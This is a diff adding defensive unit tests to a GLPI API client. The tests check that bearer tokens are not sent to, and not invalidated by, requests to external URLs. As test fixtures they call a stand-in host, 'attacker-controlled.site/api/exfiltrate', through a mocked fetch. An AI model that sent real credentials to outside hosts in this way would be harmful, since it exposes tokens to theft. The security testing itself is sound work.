@@ -194,5 +194,83 @@ describe('GlpiClient initialization', () => {
     expect((client as any).rootHttp.shouldBypassProxy('https://glpi.corp.com/api.php')).toBe(true);
     expect((client as any).rootHttp.shouldBypassProxy('https://other.com/api.php')).toBe(false);
   });
+
+  describe('Security: Cross-Origin Token Exfiltration Protection (VULN-02)', () => {
+    it('does not attach Authorization header to external absolute URLs', async () => {
+      const fetchMock = vi.fn().mockResolvedValue(
+        new Response(JSON.stringify({ external: true }), { status: 200 })
+      );
+      const customAuth: IAuthProvider = {
+        getAccessToken: vi.fn().mockResolvedValue('super-secret-glpi-token'),
+        invalidateToken: vi.fn().mockResolvedValue(undefined),
+        logout: vi.fn().mockResolvedValue(undefined),
+      };
+
+      const client = new GlpiClient({
+        apiUrl: 'https://glpi.corp.com/api.php',
+        auth: customAuth,
+        fetch: fetchMock,
+      });
+
+      // 1. External absolute URL: Bearer token must NOT be injected
+      await client.http.get('https://attacker-controlled.site/api/exfiltrate');
+      expect(fetchMock).toHaveBeenCalledWith(
+        'https://attacker-controlled.site/api/exfiltrate',
+        expect.objectContaining({
+          headers: expect.not.objectContaining({
+            Authorization: 'Bearer super-secret-glpi-token',
+          }),
+        })
+      );
+      const callHeaders = fetchMock.mock.calls[0][1].headers;
+      const authHeader = callHeaders instanceof Headers
+        ? callHeaders.get('authorization')
+        : callHeaders?.['Authorization'] ?? callHeaders?.['authorization'];
+      expect(authHeader).toBeFalsy();
+
+      // 2. Same-origin relative path: Bearer token MUST be injected
+      fetchMock.mockResolvedValueOnce(new Response(JSON.stringify({ ok: true }), { status: 200 }));
+      await client.http.get('/Assistance/Ticket');
+      const call2Headers = fetchMock.mock.calls[1][1].headers;
+      const authHeader2 = call2Headers instanceof Headers
+        ? call2Headers.get('authorization')
+        : call2Headers?.['Authorization'] ?? call2Headers?.['authorization'];
+      expect(authHeader2).toBe('Bearer super-secret-glpi-token');
+
+      // 3. Same-origin absolute URL: Bearer token MUST be injected
+      fetchMock.mockResolvedValueOnce(new Response(JSON.stringify({ ok: true }), { status: 200 }));
+      await client.http.get('https://glpi.corp.com/api.php/v2/Assistance/Ticket');
+      const call3Headers = fetchMock.mock.calls[2][1].headers;
+      const authHeader3 = call3Headers instanceof Headers
+        ? call3Headers.get('authorization')
+        : call3Headers?.['Authorization'] ?? call3Headers?.['authorization'];
+      expect(authHeader3).toBe('Bearer super-secret-glpi-token');
+    });
+
+    it('does not retry 401 on external absolute URLs or invalidate token', async () => {
+      const fetchMock = vi.fn().mockResolvedValue(
+        new Response('Unauthorized', { status: 401, statusText: 'Unauthorized' })
+      );
+      const customAuth: IAuthProvider = {
+        getAccessToken: vi.fn().mockResolvedValue('super-secret-glpi-token'),
+        invalidateToken: vi.fn().mockResolvedValue(undefined),
+        logout: vi.fn().mockResolvedValue(undefined),
+      };
+
+      const client = new GlpiClient({
+        apiUrl: 'https://glpi.corp.com/api.php',
+        auth: customAuth,
+        fetch: fetchMock,
+      });
+
+      await expect(
+        client.http.get('https://attacker-controlled.site/api/401')
+      ).rejects.toThrow();
+
+      // Token invalidation must NOT have been called for external URL
+      expect(customAuth.invalidateToken).not.toHaveBeenCalled();
+      expect(fetchMock).toHaveBeenCalledTimes(1);
+    });
+  });
 });
 
